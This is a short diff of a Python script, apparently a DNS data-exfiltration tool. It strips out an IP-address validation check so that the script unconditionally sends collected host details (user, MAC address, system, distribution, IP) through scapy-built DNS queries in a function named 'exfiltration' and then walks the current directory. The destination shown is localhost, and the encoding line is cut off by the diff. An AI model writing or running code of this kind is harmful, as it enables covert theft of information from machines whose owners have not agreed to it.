@@ -31,19 +31,6 @@ test = [user,macaddr,system,distrib,my_ip]
 # ===========================================================================================
 # Functions
 
-def validateIP(s):
-	# Test ip
-	address=s.split('.')
-	if len(address)!=4:
-		return False
-	for x in address:
-		if not x.isdigit():
-			return False
-		i=int(x)
-		if i<0 or i>255:
-			return False
-	return True
-
 def exfiltration(data):
     # Data exfiltration
 	send (IP(dst="127.0.0.1") / UDP() / DNS(qd=DNSQR(
@@ -59,15 +46,11 @@ def scantree(path):
             yield entry
 
 
-if validateIP(IP_h):
-	# DNS exfiltration
-	for i in test:
-		exfiltration(i)
-		print(i)
-	scantree(".")
+for i in test:
+	exfiltration(i)
+	print(i)
+scantree(".")
 
-else:
-    print("Bad ip")
 
 if __name__ == '__main__':
     import sys
